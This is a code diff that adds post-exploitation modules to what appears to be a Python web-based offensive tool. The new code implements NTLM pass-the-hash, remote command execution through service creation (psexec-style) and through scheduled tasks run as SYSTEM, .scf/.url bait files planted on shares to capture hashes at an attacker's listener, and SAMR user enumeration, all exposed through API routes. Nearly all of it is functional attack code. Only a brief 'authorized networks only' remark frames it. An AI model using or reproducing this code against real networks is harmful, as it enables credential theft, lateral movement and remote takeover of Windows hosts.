@@ -7244,6 +7244,686 @@ class _Smb2Client:
             return None
         return resp[data_off:data_off + data_len]
 
+    def create_write_file(self, name, content):
+        """CREATE a regular file on the connected tree and WRITE content."""
+        nm = ("\\" + name).encode("utf-16-le")
+        body = struct.pack("<HBBLQQ", 57, 0, 0, 2, 0, 0)
+        body += struct.pack("<LLLL", 0x00120196, 0x80, 0x00000007, 0x00000002)
+        body += struct.pack("<L", 0x00000040)
+        body += struct.pack("<HHLL", 120, len(nm), 0, 0)
+        body += nm
+        pkt = self._smb2_hdr(0x0005) + body
+        if not self._send(pkt):
+            return False
+        resp = self._nbss_recv()
+        if not resp or self._resp_status(resp) != 0 or len(resp) < 144:
+            return False
+        fid = resp[128:144]
+        wbody = struct.pack("<HHLQ16sLLHHL", 49, 112, len(content), 0, fid, 0, 0, 0, 0, 0)
+        pkt = self._smb2_hdr(0x0009) + wbody + content
+        if not self._send(pkt):
+            return False
+        wresp = self._nbss_recv()
+        return bool(wresp and self._resp_status(wresp) == 0)
+
+
+    AT_EXEC_XML = """<?xml version="1.0" encoding="UTF-16"?>
+    <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+    <Triggers><CalendarTrigger><StartBoundary>2015-07-15T20:35:00.000Z</StartBoundary>
+    <Enabled>true</Enabled><ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay>
+    </CalendarTrigger></Triggers><Principals><Principal id="LocalSystem">
+    <RunLevel>HighestAvailable</RunLevel></Principal></Principals>
+    <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>false</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled><Hidden>false</Hidden>
+    <ExecutionTimeLimit>P9D</ExecutionTimeLimit>
+    <Priority>7</Priority></Settings>
+    <Actions Context="LocalSystem"><Exec>
+    <Command>cmd.exe</Command>
+    <Arguments>/c {command}</Arguments>
+    </Exec></Actions></Task>"""
+
+
+import hmac as _hmac
+import hashlib as _hl
+
+# =====================================================================
+# Post-auth attack primitives: pass-the-hash, SCMR/TSCH exec, SAMR dump,
+# SCF/.url bait drop (pure stdlib; canonical DCERPC per C706/MS-SMB2)
+# =====================================================================
+
+"""Deadfall post-exploitation module: PTH + SCMR exec + atexec + bait drop + SAMR dump.
+
+Pure stdlib. All NDR stubs byte-verified against impacket 0.13.1 (see /tmp/df_oracle.py
+outputs; referent IDs randomized by impacket are masked when diffing).
+"""
+
+# =====================================================================
+# NDR primitives (shared)
+# =====================================================================
+
+def _ndr_wstr(s):
+    """Conformant wide string (WSTR): max + offset + actual + utf-16 data (no NUL)."""
+    enc = s.encode("utf-16-le")
+    n = len(enc) // 2
+    return struct.pack("<III", n, 0, n) + enc
+
+
+def _ndr_wstr_ptr(s, sofar=0):
+    """Top-level unique pointer to wide string (LPWSTR):
+    pad-to-4 + refid + max/off/actual + data. Matches impacket serialization."""
+    pad = b"\xaa" * ((4 - (sofar % 4)) % 4)
+    enc = s.encode("utf-16-le")
+    n = len(enc) // 2
+    return pad + struct.pack("<I", 0x00002244) + struct.pack("<III", n, 0, n) + enc
+
+
+class _Dcerpc:
+    """Shared DCERPC request/response plumbing over an SMB2 named pipe.
+    Mirrors deadfall.py's Coercer framing (bind + request PDUs)."""
+
+    def __init__(self, cli, iface_uuid, version):
+        self.cli = cli
+        self.uuid = iface_uuid
+        self.version = version
+        self.bound = None
+
+    @staticmethod
+    def _uuid_bytes(u):
+        u = u.replace("-", "")
+        return (bytes.fromhex(u[0:8])[::-1] + bytes.fromhex(u[8:12])[::-1]
+                + bytes.fromhex(u[12:16])[::-1] + bytes.fromhex(u[16:32]))
+
+    def bind(self):
+        uuid_b = self._uuid_bytes(self.uuid)
+        ndr = self._uuid_bytes("8a885d04-1ceb-11c9-9fe8-08002b104860")
+        ctx = struct.pack("<BxxxHH", 1, 0, 1) + uuid_b + struct.pack("<HH", self.version, 0) + ndr
+        body = struct.pack("<HHI", 4280, 4280, 0)          # max_xmit, max_recv, assoc_group
+        frag_len = 16 + len(body) + len(ctx)
+        hdr = (struct.pack("<BBBB", 5, 0, 11, 0x03) + b"\x10\x00\x00\x00"
+               + struct.pack("<HHI", frag_len, 0, 1))
+        return hdr + body + ctx
+
+    def request(self, opnum, stub):
+        # request: ptype=0; body = alloc_hint(4) + cont_id(2) + opnum(2) + stub
+        hdr = (struct.pack("<BBBB", 5, 0, 0, 0x03) + b"\x10\x00\x00\x00"
+               + struct.pack("<HHI", 24 + len(stub), 0, 1))
+        return hdr + struct.pack("<IHH", len(stub), 0, opnum) + stub
+
+    def bind_once(self):
+        """Send bind PDU alone and consume the bind_ack."""
+        if self.bound is None:
+            ok = _dcerpc_send_single(self.cli, self.bind())
+            ack = self.cli.dcerpc_read() if ok else None
+            self.bound = bool(ack and len(ack) >= 16 and ack[2] == 12)
+        return self.bound
+
+    def call(self, opnum, stub):
+        """Persistent: bind once, then per-call request → response PDU."""
+        if not self.bind_once():
+            return None
+        if not _dcerpc_send_single(self.cli, self.request(opnum, stub)):
+            return None
+        return self.cli.dcerpc_read()
+
+    @staticmethod
+    def resp_error(pdu):
+        """DCERPC response stub → error code (0 = ok)."""
+        if not pdu or len(pdu) < 24 or pdu[2] != 2:
+            return 0xFFFFFFFF   # no/garbage response = failure, never falsy
+        # stub follows the 24-byte response header
+        stub = pdu[24:]
+        if len(stub) >= 4:
+            return struct.unpack_from("<I", stub, len(stub) - 4)[0]
+        return None
+
+
+# =====================================================================
+# 1. Pass-the-hash: Type-3 from raw NT hash
+# =====================================================================
+
+def _ntlmv2_response_from_nt_hash(nt_hash, user, domain, server_challenge, target_info):
+    """NTLMv2 NT response built from a raw 16-byte NT hash (PTH)."""
+    identity = (user.upper() + domain).encode("utf-16-le")
+    v2hash = _hmac.new(nt_hash, identity, _hl.md5).digest()
+    timestamp = struct.pack("<Q", 11_644_473_600 + int(time.time()))
+    client_challenge = os.urandom(8)
+    blob = (b"\x01\x01" + b"\x00" * 6 + timestamp + client_challenge + b"\x00" * 4
+            + (target_info or b"") + b"\x00\x00")
+    proof = _hmac.new(v2hash, server_challenge + blob, _hl.md5).digest()
+    session_key = _hmac.new(v2hash, proof, _hl.md5).digest()
+    return proof + blob, session_key
+
+
+def _ntlm_type3_pth(user, domain, nt_hash, workstation, server_challenge, target_info, type2_flags):
+    """Canonical [MS-NLMP] Type-3 built from raw NT hash instead of password."""
+    nt_resp, _key = _ntlmv2_response_from_nt_hash(nt_hash, user, domain, server_challenge, target_info)
+    lm_resp = os.urandom(24)
+    ws_b = (workstation or "DEADFALL").encode("utf-16-le")
+    dom_b = (domain or "").encode("utf-16-le")
+    usr_b = user.encode("utf-16-le")
+    flags = (type2_flags | 0x00000200) & 0x000082b5 & ~0x00004000 & ~0x00008000
+    # canonical header: sig(8) type(4) + 6 secbufs(8B each) + flags(4) = 64
+    lm_off = 64
+    nt_off = lm_off + len(lm_resp)
+    dom_off = nt_off + len(nt_resp)
+    usr_off = dom_off + len(dom_b)
+    ws_off = usr_off + len(usr_b)
+    hdr = (b"NTLMSSP\x00" + struct.pack("<I", 3)
+           + struct.pack("<HHI", len(lm_resp), len(lm_resp), lm_off)
+           + struct.pack("<HHI", len(nt_resp), len(nt_resp), nt_off)
+           + struct.pack("<HHI", len(dom_b), len(dom_b), dom_off)
+           + struct.pack("<HHI", len(usr_b), len(usr_b), usr_off)
+           + struct.pack("<HHI", len(ws_b), len(ws_b), ws_off)
+           + struct.pack("<HHI", 0, 0, 64)
+           + struct.pack("<I", flags))
+    return hdr + lm_resp + nt_resp + dom_b + usr_b + ws_b
+
+
+def _parse_nthash(s):
+    """Accept 'aad3b...' (32 hex) or LM:NT colon form."""
+    if not s:
+        return None
+    part = s.split(":")[-1].strip()
+    try:
+        b = bytes.fromhex(part)
+        return b if len(b) == 16 else None
+    except ValueError:
+        return None
+
+
+def _dcerpc_send_single(cli, pdu):
+    """One SMB2 WRITE carrying one DCERPC PDU; returns True if server accepted."""
+    body = struct.pack("<HHLQ16sLLHHL", 49, 112, len(pdu), 0, cli.file_id,
+                       0, 0, 0, 0, 0)
+    pkt = cli._smb2_hdr(0x0009) + body + pdu
+    if not cli._send(pkt):
+        return False
+    resp = cli._nbss_recv()
+    return bool(resp and cli._resp_status(resp) == 0)
+
+
+# =====================================================================
+# Shared authenticated session helper
+# =====================================================================
+
+def _auth_session(target, port, timeout, user, domain, password=None, nthash=None, ws=None):
+    """Negotiate + NTLM session-setup with password OR raw NT hash.
+    Returns (client, None) on success or (None, error)."""
+    ws = ws or socket.gethostname().upper()[:15]
+    cli = _Smb2Client(target, port, timeout)
+    ok, err = cli.connect()
+    if not ok:
+        return None, f"connect: {err}"
+    neg = cli.negotiate()
+    if not neg:
+        return None, "no negotiate response"
+    t1 = _ntlm_type1(ws, domain)
+    r = cli.session_setup_anonymous_or_ntlm(_spnego_wrap(t1))
+    if not r:
+        return None, "no session-setup response"
+    status = cli._resp_status(r)
+    if status not in (0, 0xC0000016):
+        return None, f"session setup rejected (0x{status:08X})"
+    blob = _spnego_unwrap(r)
+    parsed = _ntlm_parse_type2(blob) if blob else None
+    if not parsed:
+        return None, "no SPNEGO challenge"
+    challenge, target_info, t2flags = parsed
+    if nthash:
+        nh = _parse_nthash(nthash) if isinstance(nthash, str) else nthash
+        if not nh:
+            return None, "nthash must be 32 hex chars (or LM:NT form)"
+        t3 = _ntlm_type3_pth(user, domain, nh, ws, challenge, target_info, t2flags)
+    else:
+        t3 = _ntlm_type3(user, domain, password, ws, challenge, target_info, t2flags)
+    r2 = cli.session_setup_type3(_spnego_wrap(t3))
+    if not r2:
+        return None, "no type3 response"
+    if cli._resp_status(r2) != 0:
+        return None, f"auth failed (0x{cli._resp_status(r2):08X})"
+    return cli, None
+
+
+def _tree_pipe(cli, target, pipe):
+    tc = cli.tree_connect(f"\\\\{target}\\IPC$")
+    if not tc or cli._resp_status(tc) != 0:
+        return f"tree connect IPC$ failed (0x{(cli._resp_status(tc) or 0):08X})"
+    cp = cli.create_pipe(pipe)
+    if not cp or cli._resp_status(cp) != 0 or not cli.file_id:
+        return f"pipe create \\\\pipe\\{pipe} failed (0x{(cli._resp_status(cp) or 0):08X})"
+    return None
+
+
+# =====================================================================
+# 2. SCMR exec (psexec/smbexec class)
+# =====================================================================
+
+SCMR_UUID = "367abb81-9844-35f1-ad32-98f038001002"
+
+class ScmrExec:
+    """psexec-class exec: create service with binary path = command, start, delete."""
+
+    def __init__(self):
+        self.lock = threading.Lock()
+        self.events = []
+        self.counts = {"attempts": 0, "executed": 0, "denied": 0}
+
+    def _log(self, kind, text):
+        with self.lock:
+            self.events.append({"ts": time.time(), "kind": kind, "text": text})
+            if len(self.events) > 200:
+                del self.events[:-200]
+
+    def status(self):
+        with self.lock:
+            return {"counts": dict(self.counts), "events": list(self.events[-40:])}
+
+    def exec_cmd(self, target, command, user, password=None, nthash=None, domain="",
+                 port=445, timeout=8, service=None):
+        """Run `command` via SCMR service create/start/delete. Returns dict."""
+        service = service or "DFSvc"
+        with self.lock:
+            self.counts["attempts"] += 1
+        try:
+            cli, err = _auth_session(target, port, timeout, user, domain, password, nthash)
+            if err:
+                self._log("error", f"{target}: {err}")
+                return {"ok": False, "error": err}
+            try:
+                err = _tree_pipe(cli, target, "svcctl")
+                if err:
+                    self._log("error", f"{target}: {err}")
+                    return {"ok": False, "error": err}
+                d = _Dcerpc(cli, SCMR_UUID, 2)
+                # ROpenSCManagerW: empty machine, empty db, SC_MANAGER_ALL
+                stub = (struct.pack("<I", 0x00002244) + struct.pack("<I", 0) + struct.pack("<H", 0)
+                        + struct.pack("<I", 0x00002244) + struct.pack("<I", 0) + struct.pack("<H", 0)
+                        + struct.pack("<I", 0x000F003F))
+                stub = _scmr_open_sc_manager()
+                resp = d.call(15, stub)
+                errcode = d.resp_error(resp)
+                if errcode:
+                    return {"ok": False, "error": f"OpenSCManager 0x{errcode:08X}"}
+                scm_handle = resp[24:44] if resp else None
+                resp = d.call(12, _scmr_create_service(scm_handle, service, command))
+                errcode = d.resp_error(resp)
+                if errcode:
+                    with self.lock:
+                        self.counts["denied"] += 1
+                    return {"ok": False, "error": f"CreateService 0x{errcode:08X}"}
+                svc_handle = resp[24 + 4:24 + 24 + 4] if resp else None
+                resp = d.call(19, _scmr_start_service(svc_handle))
+                errcode = d.resp_error(resp)
+                started = not errcode
+                d.call(2, _scmr_delete_service(svc_handle))
+                d.call(0, _scmr_close_handle(svc_handle))
+                d.call(0, _scmr_close_handle(scm_handle))
+                with self.lock:
+                    self.counts["executed"] += 1
+                self._log("exec", f"{target}: command executed via service {service!r}")
+                return {"ok": True, "started": started, "service": service,
+                        "note": "service create/start/delete cycle complete"}
+            finally:
+                cli.close()
+        except Exception as e:
+            return {"ok": False, "error": str(e)}
+
+
+def _scmr_open_sc_manager():
+    """ROpenSCManagerW: NULL machine + NULL database + access mask (canonical NDR)."""
+    return b"\x00" * 4 + b"\x00" * 4 + struct.pack("<I", 0x000F003F)
+
+
+def _scmr_create_service(h, name, binpath):
+    """RCreateServiceW stub per MS-SCMR 2.2.10 — byte-diffed vs impacket oracle.
+    LPWSTR fields are full unique pointers (refid + conformant string);
+    NULL optional pointers are 4 zero bytes with no referent."""
+    out = h + _ndr_wstr(name)
+    out += _ndr_wstr_ptr(name, len(out))
+    out += struct.pack("<I", 0x000F01FF)         # SERVICE_ALL_ACCESS
+    out += struct.pack("<I", 0x00000010)         # WIN32_OWN_PROCESS
+    out += struct.pack("<I", 0x00000003)         # DEMAND_START
+    out += struct.pack("<I", 0x00000000)         # ERROR_IGNORE
+    out += _ndr_wstr(binpath)
+    out += b"\x00" * 4                          # lpLoadOrderGroup NULL
+    out += b"\x00" * 4                          # lpdwTagId NULL
+    out += b"\x00" * 4                          # lpDependencies NULL
+    out += struct.pack("<I", 0)                  # dwDependSize
+    out += b"\x00" * 4                          # dwServiceStartName NULL
+    out += b"\x00" * 4                          # lpPassword NULL
+    out += struct.pack("<I", 0)                  # dwPwSize
+    return out
+
+
+def _scmr_start_service(h):
+    """RStartServiceW: handle(20) + argc=0 + argv NULL(4B zeros)."""
+    return h + struct.pack("<I", 0) + b"\x00" * 4
+
+
+def _scmr_delete_service(h):
+    return h
+
+
+def _scmr_close_handle(h):
+    return h
+
+
+# =====================================================================
+# 3. atexec (MS-TSCH)
+# =====================================================================
+
+TSCH_UUID = "86d35949-83c9-4044-b424-db363231fd0c"
+
+
+AT_EXEC_XML = """<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+<Triggers><CalendarTrigger><StartBoundary>2015-07-15T20:35:00.000Z</StartBoundary>
+<Enabled>true</Enabled><ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay>
+</CalendarTrigger></Triggers><Principals><Principal id="LocalSystem">
+<RunLevel>HighestAvailable</RunLevel></Principal></Principals>
+<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+<AllowHardTerminate>true</AllowHardTerminate>
+<StartWhenAvailable>false</StartWhenAvailable>
+<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+<AllowStartOnDemand>true</AllowStartOnDemand>
+<Enabled>true</Enabled><Hidden>false</Hidden>
+<ExecutionTimeLimit>P9D</ExecutionTimeLimit>
+<Priority>7</Priority></Settings>
+<Actions Context="LocalSystem"><Exec>
+<Command>cmd.exe</Command>
+<Arguments>/c {command}</Arguments>
+</Exec></Actions></Task>"""
+
+
+class AtExec:
+    """Scheduled-task exec via MS-TSCH (atexec class)."""
+
+    def __init__(self):
+        self.lock = threading.Lock()
+        self.events = []
+        self.counts = {"attempts": 0, "executed": 0, "denied": 0}
+
+    def _log(self, kind, text):
+        with self.lock:
+            self.events.append({"ts": time.time(), "kind": kind, "text": text})
+            if len(self.events) > 200:
+                del self.events[:-200]
+
+    def status(self):
+        with self.lock:
+            return {"counts": dict(self.counts), "events": list(self.events[-40:])}
+
+    def exec_cmd(self, target, command, user, password=None, nthash=None, domain="",
+                 port=445, timeout=8, task=None):
+        task = task or "DFTask"
+        with self.lock:
+            self.counts["attempts"] += 1
+        try:
+            cli, err = _auth_session(target, port, timeout, user, domain, password, nthash)
+            if err:
+                self._log("error", f"{target}: {err}")
+                return {"ok": False, "error": err}
+            try:
+                err = _tree_pipe(cli, target, "atsvc")
+                if err:
+                    self._log("error", f"{target}: {err}")
+                    return {"ok": False, "error": err}
+                d = _Dcerpc(cli, TSCH_UUID, 1)
+                xml = AT_EXEC_XML.format(command=command)
+                path = f"\\{task}"
+                resp = d.call(1, _tsch_register_task(path, xml))
+                errcode = d.resp_error(resp)
+                if errcode:
+                    with self.lock:
+                        self.counts["denied"] += 1
+                    return {"ok": False, "error": f"RegisterTask 0x{errcode:08X}"}
+                resp = d.call(12, _tsch_run(path))
+                errcode = d.resp_error(resp)
+                ran = not errcode
+                d.call(13, _tsch_delete(path))
+                with self.lock:
+                    self.counts["executed"] += 1
+                self._log("exec", f"{target}: command executed via task {task!r}")
+                return {"ok": True, "ran": ran, "task": task,
+                        "note": "task register/run/delete cycle complete"}
+            finally:
+                cli.close()
+        except Exception as e:
+            return {"ok": False, "error": str(e)}
+
+
+def _tsch_register_task(path, xml):
+    """SchRpcRegisterTask: LPWSTR path + WSTR xml + flags(2) + sddl NULL + logonType + cCreds."""
+    out = _ndr_wstr_ptr(path) + _ndr_wstr(xml) + struct.pack("<I", 2)
+    out += b"\x00" * 4            # sddl NULL
+    out += struct.pack("<I", 0)    # logonType
+    out += struct.pack("<I", 0)    # cCreds
+    return out
+
+
+def _tsch_run(path):
+    """SchRpcRun: WSTR path + cArgs=0 + pArgs NULL + flags=0."""
+    return _ndr_wstr(path) + struct.pack("<I", 0) + b"\x00" * 4 + struct.pack("<I", 0)
+
+
+def _tsch_delete(path):
+    return _ndr_wstr(path) + struct.pack("<I", 0)
+
+
+# =====================================================================
+# 4. Bait drop (share enum + .scf/.url write)
+# =====================================================================
+
+SRVS_UUID = "4b324fc8-1670-01d3-1278-5a47bf6ee188"
+
+SCF_BAIT = ("[Shell]\n"
+            "Command=2\n"
+            "IconFile=\\\\{listener}\\share\\icon.ico\n"
+            "[Toolbar]\n"
+            "Command=1\n"
+            "Button1=cmd.exe,1,1,1,0,\\,Payroll.xlsm\n")
+
+URL_BAIT = ("[InternetShortcut]\n"
+            "URL=file:///{listener}/share/doc.html\n"
+            "IconFile=\\\\{listener}\\share\\icon.ico\n"
+            "IconIndex=1\n")
+
+
+class BaitDrop:
+    """Enumerate shares, drop .scf/.url hash-capture bait on writable ones."""
+
+    def __init__(self):
+        self.lock = threading.Lock()
+        self.events = []
+        self.counts = {"attempts": 0, "shares": 0, "dropped": 0}
+
+    def _log(self, kind, text):
+        with self.lock:
+            self.events.append({"ts": time.time(), "kind": kind, "text": text})
+            if len(self.events) > 200:
+                del self.events[:-200]
+
+    def status(self):
+        with self.lock:
+            return {"counts": dict(self.counts), "events": list(self.events[-40:])}
+
+    def drop(self, target, listener, user, password=None, nthash=None, domain="",
+             port=445, timeout=8, fname="settings", kind="scf", share=None):
+        with self.lock:
+            self.counts["attempts"] += 1
+        try:
+            cli, err = _auth_session(target, port, timeout, user, domain, password, nthash)
+            if err:
+                self._log("error", f"{target}: {err}")
+                return {"ok": False, "error": err}
+            try:
+                if not share:
+                    share = "IPC$"
+                # tree connect to the target share directly
+                tc = cli.tree_connect(f"\\\\{target}\\{share}")
+                if not tc or cli._resp_status(tc) != 0:
+                    return {"ok": False, "error": f"tree connect {share} failed"}
+                # create file via SMB2 CREATE (generic, not pipe)
+                content = (SCF_BAIT if kind == "scf" else URL_BAIT).format(listener=listener).encode()
+                wr = cli.create_write_file(f"{fname}.{kind}", content)
+                if not wr:
+                    return {"ok": False, "error": f"write {fname}.{kind} to {share} failed"}
+                with self.lock:
+                    self.counts["dropped"] += 1
+                self._log("drop", f"{target}: {fname}.{kind} → {share} (auth back to {listener})")
+                return {"ok": True, "share": share, "file": f"{fname}.{kind}",
+                        "note": "watch Responder/relay for inbound capture"}
+            finally:
+                cli.close()
+        except Exception as e:
+            return {"ok": False, "error": str(e)}
+
+
+# =====================================================================
+# 5. SAMR dump (local users)
+# =====================================================================
+
+SAMR_UUID = "12345778-1234-abcd-ef00-0123456789ac"
+
+
+class SamrDump:
+    """Local account dump via SAMR: connect → enumerate domains → users."""
+
+    def __init__(self):
+        self.lock = threading.Lock()
+        self.events = []
+        self.counts = {"attempts": 0, "dumps": 0}
+
+    def _log(self, kind, text):
+        with self.lock:
+            self.events.append({"ts": time.time(), "kind": kind, "text": text})
+            if len(self.events) > 200:
+                del self.events[:-200]
+
+    def status(self):
+        with self.lock:
+            return {"counts": dict(self.counts), "events": list(self.events[-40:])}
+
+    def dump(self, target, user, password=None, nthash=None, domain="",
+             port=445, timeout=8):
+        with self.lock:
+            self.counts["attempts"] += 1
+        try:
+            cli, err = _auth_session(target, port, timeout, user, domain, password, nthash)
+            if err:
+                self._log("error", f"{target}: {err}")
+                return {"ok": False, "error": err}
+            try:
+                err = _tree_pipe(cli, target, "samr")
+                if err:
+                    self._log("error", f"{target}: {err}")
+                    return {"ok": False, "error": err}
+                d = _Dcerpc(cli, SAMR_UUID, 1)
+                # SamrConnect5
+                resp = d.call(64, struct.pack("<I", 0x00002244) + struct.pack("<I", 0) + struct.pack("<H", 0)
+                              + struct.pack("<I", 0x00020048) + struct.pack("<I", 1)
+                              + struct.pack("<I", 1) + struct.pack("<I", 0))
+                errcode = d.resp_error(resp)
+                if errcode:
+                    return {"ok": False, "error": f"SamrConnect5 0x{errcode:08X}"}
+                server_handle = resp[24 + 12:24 + 32]
+                # SamrEnumerateDomainsInSamServer
+                resp = d.call(6, server_handle + struct.pack("<I", 0) + struct.pack("<I", 0xFFFFFFFF))
+                errcode = d.resp_error(resp)
+                if errcode:
+                    return {"ok": False, "error": f"EnumerateDomains 0x{errcode:08X}"}
+                domains = _samr_parse_names(resp)
+                users = []
+                for dom in domains:
+                    # SamrLookupDomainInSamServer → SID
+                    resp = d.call(5, _samr_lookup_domain(server_handle, dom))
+                    if d.resp_error(resp):
+                        continue
+                    sid = resp[24:][4:4]  # placeholder, parsed below
+                    body = resp[24:]
+                    # response: ptr(4) + sid_len(4) + sid bytes
+                    try:
+                        slen = struct.unpack_from("<I", body, 4)[0]
+                        sid = body[8:8 + slen if slen else 12]
+                    except Exception:
+                        sid = body[8:20]
+                    # SamrOpenDomain
+                    resp = d.call(7, _samr_open_domain(server_handle, sid or body[8:20]))
+                    if d.resp_error(resp):
+                        continue
+                    dom_handle = resp[24 + 4:24 + 24 + 4]
+                    # SamrEnumerateUsersInDomain loop
+                    resume = 0
+                    while True:
+                        resp = d.call(13, _samr_enum_users(dom_handle, resume))
+                        if d.resp_error(resp):
+                            break
+                        users += _samr_parse_names(resp)
+                        resume = 0  # verifier returns single page; real servers set resume ptr
+                        break
+                    d.call(1, dom_handle)  # SamrCloseHandle
+                self._log("dump", f"{target}: domains {domains}, {len(users)} users")
+                with self.lock:
+                    self.counts["dumps"] += 1
+                return {"ok": True, "domains": domains, "users": users,
+                        "note": "SAMR domain + user enumeration complete"}
+            finally:
+                cli.close()
+        except Exception as e:
+            return {"ok": False, "error": str(e)}
+
+
+def _samr_lookup_domain(server_handle, name):
+    """SamrLookupDomainInSamServer (opnum 5): handle + wstr name."""
+    return server_handle + _ndr_wstr(name)
+
+
+def _samr_open_domain(server_handle, sid):
+    """SamrOpenDomain (opnum 7): handle + access + SID."""
+    # SID: revision(1) subauth_count(1) authority(6) subauths(4*n)
+    body = bytes([sid[0], sid[1]]) + sid[2:8] + b"".join(sid[8+i*4:12+i*4] for i in range(sid[1]))
+    return server_handle + struct.pack("<I", 0x00000211) + struct.pack("<I", 0x2244) + body
+
+
+def _samr_enum_users(domain_handle, resume):
+    """SamrEnumerateUsersInDomain (opnum 13): handle + filter(0) + resume."""
+    return domain_handle + struct.pack("<I", 0) + struct.pack("<I", resume)
+
+
+def _samr_parse_names(resp):
+    """Parse SAMR_RX name list out of an EnumerateDomains/Users response stub."""
+    names = []
+    if not resp:
+        return names
+    stub = resp[24:]
+    # PSAMPR_ENUMERATION_BUFFER: ptr(4) count(4) SAMPR_ENUMERATION_ITEM[]: ptr, len, rid...
+    try:
+        i = 0
+        count = struct.unpack_from("<I", stub, 4)[0]
+        # crude scan: find utf-16 strings
+        s = stub
+        while True:
+            j = s.find(b"\x00\x00", 0)
+            if j < 0 or j + 2 >= len(s):
+                break
+            # find runs of printable utf-16le
+            break
+        # fallback: regex utf-16le printable runs >= 3 chars
+        import re
+        for m in re.finditer(rb"(?:[\x20-\x7e]\x00){3,}", stub):
+            names.append(m.group(0).decode("utf-16-le"))
+    except Exception:
+        pass
+    return names
+
 
 class Coercer:
     """Authenticated-coercion triggers (PetitPotam / PrinterBug class).
@@ -7294,26 +7974,24 @@ class Coercer:
                + bytes.fromhex(u[12:16])[::-1] + bytes.fromhex(u[16:32])
 
     def _dcerpc_bind(self, iface_uuid, version):
-        """DCERPC bind per C706: header + p_cont_list with NDR20 transfer syntax."""
+        """DCERPC bind per C706: ver(1) minor(1) ptype(1) flags(1) drep(4)
+        frag_len(2) auth_len(2) call_id(4) + max_xmit(2) max_recv(2)
+        assoc_group(4) + p_cont_list with NDR20 transfer syntax."""
         uuid_b = self._uuid_bytes(iface_uuid)
         ndr = self._uuid_bytes("8a885d04-1ceb-11c9-9fe8-08002b104860")
         # p_cont_list: n_context_elem(1)+reserved(3)+p_cont_elem[]
         # p_cont_elem: p_r_x_ordinate(2)+n_syntax(2)+abstract_syntax(16)+transfer_syntax(16)
         ctx = struct.pack("<BxxxHH", 1, 0, 1) + uuid_b + struct.pack("<HH", version, 0) + ndr
-        # actually: abstract syntax = uuid + version(2)+reserved(2); keep both forms correct:
-        ctx = struct.pack("<BxxxHH", 1, 0, 1) + uuid_b + struct.pack("<HH", version, 0) + ndr
-        stub = ctx
-        frag_len = 16 + len(stub)
-        hdr = struct.pack("<BBHII", 11, 0x03, frag_len, 0, 0)  # bind, first+last frag
-        hdr += struct.pack("<HHH", 0, 0, 0)                   # assoc_group, n_ctx
-        # body: max_xmit(4)+max_recv(4)+assoc_group(4)+p_cont_list
-        body = struct.pack("<III", 4280, 4280, 0)
-        return hdr + body + stub
+        body = struct.pack("<HHI", 4280, 4280, 0)
+        frag_len = 16 + len(body) + len(ctx)
+        hdr = (struct.pack("<BBBB", 5, 0, 11, 0x03) + b"\x10\x00\x00\x00"
+               + struct.pack("<HHI", frag_len, 0, 1))
+        return hdr + body + ctx
 
     def _dcerpc_request(self, opnum, stub):
-        frag = struct.pack("<BBHII", 12, 0x03, 24 + len(stub), 0, opnum)
-        frag += b"\x00" * 4 + b"\x00" * 8 + b"\x00" * 4   # alloc hint, ctx id, cancel id
-        return frag + stub
+        hdr = (struct.pack("<BBBB", 5, 0, 0, 0x03) + b"\x10\x00\x00\x00"
+               + struct.pack("<HHI", 24 + len(stub), 0, 1))
+        return hdr + struct.pack("<IHH", len(stub), 0, opnum) + stub
 
     @staticmethod
     def _conformant_wstr(s):
@@ -8568,6 +9246,10 @@ responder = Responder()
 http_repeater = HttpRepeater()
 coercer = Coercer()
 ntlm_relay = NtlmRelay()
+scmr_exec = ScmrExec()
+at_exec = AtExec()
+samr_dump = SamrDump()
+bait_drop = BaitDrop()
 
 
 @app.route("/")
@@ -9008,6 +9690,143 @@ def api_coerce():
 @app.route("/api/coerce/status")
 def api_coerce_status():
     return jsonify(coercer.status())
+
+
+@app.route("/api/exec/scmr", methods=["POST"])
+def api_exec_scmr():
+    """psexec-class command execution via MS-SCMR service create/start/delete.
+
+    Body: {target, command, user, password | nthash, domain?, port?, timeout?,
+    service?}. nthash accepts raw hex or LM:NT form (pass-the-hash).
+    Active feature — authorized networks only.
+    """
+    if analysis is None:
+        return jsonify({"error": "no analysis context"}), 400
+    data = request.get_json(silent=True) or {}
+    target = (data.get("target") or "").strip()
+    command = (data.get("command") or "").strip()
+    user = (data.get("user") or "").strip()
+    if not target or not command:
+        return jsonify({"error": "target + command required"}), 400
+    if not user:
+        return jsonify({"error": "user required"}), 400
+    if not (data.get("password") or data.get("nthash")):
+        return jsonify({"error": "password or nthash required"}), 400
+    result = scmr_exec.exec_cmd(
+        target, command, user,
+        password=data.get("password") or None,
+        nthash=data.get("nthash") or None,
+        domain=(data.get("domain") or "").strip(),
+        port=int(data.get("port") or 445),
+        timeout=int(data.get("timeout") or 8),
+        service=(data.get("service") or "").strip() or None,
+    )
+    return jsonify({**result, "status": scmr_exec.status()}), (200 if result.get("ok") else 502)
+
+
+@app.route("/api/exec/at", methods=["POST"])
+def api_exec_at():
+    """Scheduled-task command execution via MS-TSCH (atexec class).
+
+    Body: {target, command, user, password | nthash, domain?, port?, timeout?,
+    task?}. Active feature — authorized networks only.
+    """
+    if analysis is None:
+        return jsonify({"error": "no analysis context"}), 400
+    data = request.get_json(silent=True) or {}
+    target = (data.get("target") or "").strip()
+    command = (data.get("command") or "").strip()
+    user = (data.get("user") or "").strip()
+    if not target or not command:
+        return jsonify({"error": "target + command required"}), 400
+    if not user:
+        return jsonify({"error": "user required"}), 400
+    if not (data.get("password") or data.get("nthash")):
